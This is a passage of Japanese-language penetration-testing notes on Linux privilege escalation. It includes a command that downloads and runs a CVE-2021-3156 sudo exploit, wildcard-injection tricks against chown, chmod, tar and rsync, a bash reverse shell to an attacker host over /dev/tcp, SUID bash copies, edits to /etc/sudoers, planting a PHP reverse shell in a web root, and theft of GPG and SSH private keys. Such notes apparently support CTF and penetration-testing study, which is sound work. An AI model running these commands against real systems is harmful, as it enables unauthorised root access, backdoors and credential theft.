```sh
curl -fsSL https://raw.githubusercontent.com/worawit/CVE-2021-3156/main/exploit_nss.py -o exploit_nss.py
python3 exploit_nss.py
```

#### ディストロごとの vulnerable / fixed バージョン

参考：https://www.qualys.com/2021/01/26/cve-2021-3156/baron-samedit-heap-based-overflow.txt

|Ubuntu version|Vulnerable|Fixed|
|---|---|---|
|16.04 LTS|1.8.16 ～ 1.8.31p2|1.8.16-0ubuntu1.10|
|18.04 LTS|1.8.21p2 ～ 1.8.31p2|1.8.21p2-3ubuntu1.4|
|20.04 LTS|1.8.31|1.8.31-1ubuntu1.2|

|Debian version|Vulnerable|Fixed|
|---|---|---|
|Stretch|vulnerable|1.8.19p1-2.1+deb9u3|
|Buster|vulnerable|1.8.27-1+deb10u3|
|Bullseye|vulnerable|1.9.5p2-3|

|RHEL / CentOS Version|Fixed|
|---|---|
|6|sudo-1.8.6p7-29.el6_10.3|
|7|sudo-1.8.23-10.el7_9.1|
|8|sudo-1.8.29-6.el8_3.1|

---

---

# Serviceを利用したPrivEsc

1. サービスの定義ファイルを確認し、実行ファイルのパスを調べる

```zsh
systemctl cat <service>
```

↓出力例

```zsh
[Service]
ExecStart=/usr/local/bin/<xxx.sh>
```

2. 実行ファイルのパーミッションを確認する

```zsh
ls -la <path_to_binary>
```

↓出力例

```zsh
-rwxrwxrwx 1 root root 1234 Aug 30 10:00 /usr/local/bin/xxx.sh
```

→ 誰でも書き換え可能な状態（777）

3. [What is the shell](https://claude.ai/Common/What%20is%20the%20shell.md#%F0%9F%94%81Python%E3%81%8C%E4%BD%BF%E3%81%88%E3%81%AA%E3%81%84%E5%A0%B4%E5%90%88)のペイロードを実行ファイルに書き込み、サービスをrestartして実行させる

---

---

# Unix Wildcards Gone Wild

## Unix Wildcardの基礎

|Wildcard|説明|例|
|---|---|---|
|`*`|0個以上の任意の文字列にマッチ|`*.php` → すべてのPHPファイル|
|`?`|任意の1文字にマッチ|`test?` → test1, testa など|
|`[ ]`|ブラケット内の任意の1文字にマッチ|`[abc]*.txt` → a, b, c で始まるtxtファイル|
|`-`|`[ ]` 内で文字範囲を指定|`[a-z]*` → 小文字で始まるファイル|
|`~`|ホームディレクトリに展開（単語の先頭）。`~username` でそのユーザーのホームディレクトリ|`~/.bashrc` → 自分のホームの.bashrc|

---

## Wildcard Attack の仕組み

### 攻撃原理

- シェルはワイルドカードを展開する際、ハイフン（`-`）で始まるファイル名をコマンドラインオプションとして解釈する（例：`-rf` というファイル名）
- これにより、攻撃者が作成した「オプション名のようなファイル名」が、実行コマンドの引数として注入される（Argument Injection）
- rootが実行するコマンドが**書き込み可能なディレクトリ**をワイルドカード指定しているときに成立する
- 参考：[Back To The Future: Unix Wildcards Gone Wild - Exploit-DB](https://www.exploit-db.com/papers/33930)

### 基本例：`rm *` による再帰削除

```zsh
# 攻撃前のディレクトリ状態
$ ls -al
drwxrwxr-x. DIR1
drwxrwxr-x. DIR2
-rw-rw-r--. file1.txt
-rw-rw-r--. file2.txt
-rw-rw-r--. -rf          # 攻撃者が作成したファイル

# rootが削除コマンドを実行
$ rm *
```

- 結果：すべてのファイル・ディレクトリが再帰削除される
- 理由：`rm DIR1 DIR2 file1.txt file2.txt -rf` と展開され、`-rf` オプションが適用されるため

---

## 実践的な攻撃手法

### Chown File Reference Trick（ファイル所有者ハイジャック）

#### 仕組み

`chown` の `--reference` オプションを悪用し、指定ファイルの所有者情報を参照させる

```
--reference=RFILE
    指定したRFILEの所有者・グループを使用（OWNER:GROUP値の代わりに）
```

#### エクスプロイト手順

1. 書き込み可能なディレクトリにダミー参照ファイル（DRF: Dummy Reference File）を作成する

```bash
touch .drf.php
chmod 644 .drf.php
```

2. `--reference` オプションとして解釈されるファイル名のファイルを作成する

```bash
touch -- '--reference=.drf.php'
# または
touch ./'--reference=.drf.php'
```

3. rootが所有者変更を実行すると...

```bash
# rootの意図：すべてのPHPファイルをnobody:nobodyに変更
chown -R nobody:nobody *.php

# 実際の展開：
# chown -R nobody:nobody admin.php config.php ... --reference=.drf.php
```

→ `.drf.php` の所有者（攻撃者）がすべてのファイルの所有者になる

**応用**：シンボリックリンクと組み合わせることで `/etc/shadow` などの重要ファイルの所有者も奪取できる

```bash
ln -s /etc/shadow .drf.php
```

### Chmod File Reference Trick（権限ハイジャック）

#### 仕組み

`chmod` の `--reference` オプションを悪用し、指定ファイルの権限を参照させる

```
--reference=RFILE
    MODE値の代わりにRFILEのモード（権限）を使用
```

#### エクスプロイト手順

1. 書き込み可能なディレクトリに任意の権限を持つダミー参照ファイルを作成する

```bash
touch .drf.php
chmod 777 .drf.php
```

2. `--reference` オプションとして解釈されるファイル名のファイルを作成する

```bash
touch -- '--reference=.drf.php'
```

3. rootが権限変更を実行すると...

```bash
# rootの意図：すべてのファイルを000（アクセス不可）に変更
chmod 000 *

# 実際の展開：
# chmod 000 file1.php file2.php ... --reference=.drf.php
```

→ すべてのファイルが777権限になる

**応用**：`-R` ファイルも作成すれば、サブディレクトリも再帰的に権限変更できる

```bash
touch -- '-R'
```

### Tar Arbitrary Command Execution（任意コマンド実行）

#### 仕組み

`tar` の `--checkpoint-action` オプションを悪用し、チェックポイント到達時に任意コマンドを実行させる

```
--checkpoint[=NUMBER]
    NUMBERレコードごとに進捗メッセージを表示（デフォルト10）

--checkpoint-action=ACTION
    各チェックポイントでACTIONを実行
```

#### エクスプロイト手順（Wildcard Injection版）

1. 書き込み可能なディレクトリに悪意あるシェルスクリプトを作成する

```zsh
cat > shell.sh << 'EOF'
#!/bin/bash
/bin/bash -i >& /dev/tcp/<attacker_IP>/<port> 0>&1
EOF
chmod +x shell.sh
```

または

```zsh
cat > shell.sh << 'EOF'
#!/bin/bash
cp /bin/bash /tmp/rootbash
chmod +xs /tmp/rootbash
EOF
chmod +x shell.sh
```

2. `--checkpoint=1` ファイルを作成する（1レコードごとにアクションを実行）

```bash
echo "" > "--checkpoint=1"
```

3. `--checkpoint-action` ファイルを作成する

```bash
echo "" > "--checkpoint-action=exec=sh shell.sh"
```

4. rootがtarを実行すると...

```bash
# rootの意図：アーカイブ作成または展開
tar cf archive.tar *
# または
tar -zxf /tmp/backup.tar.gz *

# 実際の展開：
# tar cf archive.tar file1 file2 ... --checkpoint=1 --checkpoint-action=exec=sh shell.sh
```

→ 1レコードごとに `shell.sh` がroot権限で実行される

---

### Rsync Arbitrary Command Execution（任意コマンド実行）

#### 仕組み

`rsync` の `-e` オプションを悪用し、リモートシェルとして任意コマンドを実行させる

```
-e, --rsh=COMMAND
    使用するリモートシェルを指定
```

#### エクスプロイト手順

1. 書き込み可能なディレクトリに悪意あるシェルスクリプトを作成する

```bash
cat > shell.sh << 'EOF'
#!/bin/bash
cp /bin/bash /tmp/rootbash
chmod +xs /tmp/rootbash
EOF
chmod +x shell.sh
```

> [!NOTE] 元のノートではファイル名が `shell.c` となっていたが、内容はBashスクリプトのためこれは誤り。`shell.sh` が正しい

2. `-e` オプションとして解釈されるファイル名のファイルを作成する

```bash
touch -- '-e sh shell.sh'
```

3. rootがrsyncを実行すると...

```bash
# rootの意図：すべての.shファイルをリモートにコピー
rsync -t *.sh foo:src/

# 実際の展開：
# rsync -t -e sh shell.sh <他のファイル> foo:src/
```

→ `shell.sh` がシェルスクリプトとしてroot権限で実行される

4. 権限昇格する

```bash
/tmp/rootbash -p
```

---

---

# Misc

## `sudo` と `su` によるPrivEsc

```zsh
sudo su
su root
```

---

## /etc/sudoersへの書き込み

- `/etc/sudoers` に任意のユーザー名を追記してすべての権限を付与すれば、そのユーザーがsudoを使えるようになる
- GTFOBinsで `LFILE='/path/to/file_to_write'` となっているコマンドを使う場合に有効なテクニック

```zsh
# 基本原理
echo '<username> ALL=(ALL:ALL) ALL' >> /etc/sudoers
sudo su

# 具体例（dosboxを使う場合）
LFILE='/etc/sudoers'
dosbox -c 'mount c /' -c "echo commander ALL=(ALL:ALL) ALL >> C:$LFILE" -c exit
sudo su
```

---

## SSHキーによるPrivEsc

```zsh
# ターゲットマシン上でSSHキーの中身を表示する
cat <ssh_key>
```

```zsh
# 攻撃者マシン上でキーをファイルに保存し、rootとしてターゲットに接続する
echo '<ssh_key>' > ssh.key
chmod 600 ssh.key
ssh -i ssh.key -oPubkeyAcceptedKeyTypes=+ssh-rsa -oHostKeyAlgorithms=+ssh-rsa root@<target_IP>
```

> [!NOTE] 元のノートではSSHキーファイルのパーミッションを `777` に設定しているが、SSHはパーミッションが緩すぎる秘密鍵を拒否する。正しくは `600`（所有者のみ読み書き可能）にすること

---

## Webサーバーを起動できるとき

1. 攻撃者マシン上でリバースシェルリスナーを用意する
2. ターゲットの書き込み可能なWebサーバールートディレクトリ（例：`/phpMyAdmin/tmp/`）に[php-reverse-shell-payload](https://github.com/ivan-sincek/php-reverse-shell/blob/master/src/reverse/php_reverse_shell.php)を配置する
3. Webサーバーを起動する（root権限が必要）

```zsh
# OpenBSD系
doas service apache24 onestart

# Debian系
sudo systemctl start apache2
```

4. ターゲットのローカルで動作しているWebサーバーにリクエストを送る

```zsh
curl http://127.0.0.1/phpMyAdmin/tmp/backdoor.php
```

---

## GPG

### GPGとは

- GPG（GNU Privacy Guard）はデータの暗号化と署名のためのオープンソースツールで、公開鍵暗号方式を使用する
    - 主な用途：ファイル・メールの暗号化、デジタル署名による認証、鍵管理
- `gpg-agent` は、GPG秘密鍵のパスフレーズをメモリにキャッシュし、一定期間再入力を不要にするデーモン
- `.gpg` ファイルには主に以下の3種類がある（`file <file>` コマンドで判別可能）

|ファイルタイプ|読み取り方|用途|`file` コマンド出力|
|---|---|---|---|
|暗号化ファイル|`gpg --decrypt`|機密データの保護（最重要）|GPG symmetrically encrypted data (AES256 cipher)|
|公開鍵リング|`gpg --import`|公開鍵の保管（基本的に無視でよい）|PGP/GPG key public ring|
|秘密鍵リング|`gpg --import`|署名偽装や他データの復号|PGP/GPG key security ring|

### 秘密鍵の窃取と解析

- `~/.gnupg/secring.gpg`（旧形式）や `~/.gnupg/private-keys-v1.d/`（新形式）を奪取する
- 奪取した秘密鍵に対して `gpg2john` でハッシュ化し、`john` や `hashcat` でパスフレーズをオフライン攻撃する

### 秘密鍵をインポートして暗号ファイルを復号する

1. 秘密鍵があるか確認する

```zsh
gpg --list-secret-keys
```

2. 秘密鍵をインポートする

```zsh
gpg --import <stolen_key>
```

3. 暗号化されたファイルを復号する

```zsh
gpg --decrypt <file>.gpg
```

→ gpg-agentのキャッシュが有効であれば、パスフレーズの入力なしで復号できる

### LinPEASでの表示

- LinPEASでは以下のように表示される

```zsh
╔══════════╣ Analyzing PGP-GPG Files (limit 70)
/usr/bin/gpg
netpgpkeys Not Found
netpgp Not Found

-rw-r--r-- 1 root root 2796 Mar 29  2021 /etc/apt/trusted.gpg.d/ubuntu-keyring-2012-archive.gpg
-rw-r--r-- 1 root root 0 Jan 17  2018 /snap/core18/2566/usr/share/keyrings/ubuntu-cloudimage-removed-keys.gpg
```

> [!TIP] `/usr/share/keyrings` 配下や `ubuntu-keyring...` といったファイルは公開鍵リングなので、調査対象から除外してよい

---

---

# 参考リンク

- [PayloadAllTheThings - Linux Privilege Escalation](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Linux%20-%20Privilege%20Escalation.md)